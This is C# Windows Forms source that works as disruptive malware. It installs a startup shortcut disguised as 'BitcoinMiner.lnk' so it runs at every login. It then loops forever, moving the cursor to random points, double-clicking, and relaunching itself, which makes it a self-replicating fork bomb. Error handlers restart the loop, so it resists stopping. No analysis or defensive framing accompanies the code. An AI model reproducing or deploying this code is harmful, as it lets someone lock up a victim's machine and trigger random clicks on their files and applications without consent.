using IWshRuntimeLibrary;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace RandomFileCreator2
{
    public partial class Form1 : Form
    {
        [DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
        public static extern void mouse_event(long dwFlags, long dx, long dy, long cButtons, long dwExtraInfo);

        public static int MOUSEEVENTF_LEFTDOWN = 0x02;
        public static int MOUSEEVENTF_LEFTUP = 0x04;
        public static int MOUSEEVENTF_RIGHTDOWN = 0x08;
        public static int MOUSEEVENTF_RIGHTUP = 0x10;

        public static Random random = new Random();
        public static string appPath = System.Reflection.Assembly.GetEntryAssembly().Location;
        public static string startUp = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\BitcoinMiner.lnk";
        public static int screenWidth = 1920;
        public static int screenHeight = 1080;

        public Form1()
        {
            try
            {
                if (System.IO.File.Exists(startUp))
                    Run();
                CreateShortcut(startUp);
            }
            catch (Exception)
            {
                try
                {
                    string userStartUp = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\BitcoinMiner.lnk";
                    if (System.IO.File.Exists(userStartUp))
                        Run();
                    CreateShortcut(userStartUp);
                }
                catch (Exception) { }
            }

            Run();
        }

        public static void Run()
        {
            try
            {
                while (true)
                {
                    Cursor.Position = new Point(random.Next(0, screenWidth), random.Next(0, screenHeight));
                    DoMouseClick();
                    DoMouseClick();
                    Process.Start(appPath);
                }
            }
            catch (Exception)
            {
                Run();
            }
        }

        public static void DoMouseClick()
        {
            int x = Cursor.Position.X;
            int y = Cursor.Position.Y;
            try
            {
                mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, x, y, 0, 0);
            }
            catch (Exception)
            {
                DoMouseClick();
            }
        }

        public static void CreateShortcut(string targetPath)
        {
            WshShell shell = new WshShell();
            string shortcutAddress = targetPath;
            IWshShortcut shortcut = (IWshShortcut)shell.CreateShortcut(shortcutAddress);
            shortcut.Description = "";
            shortcut.Hotkey = "Ctrl+Shift+N";
            shortcut.TargetPath = appPath;
            shortcut.Save();
        }
    }
}
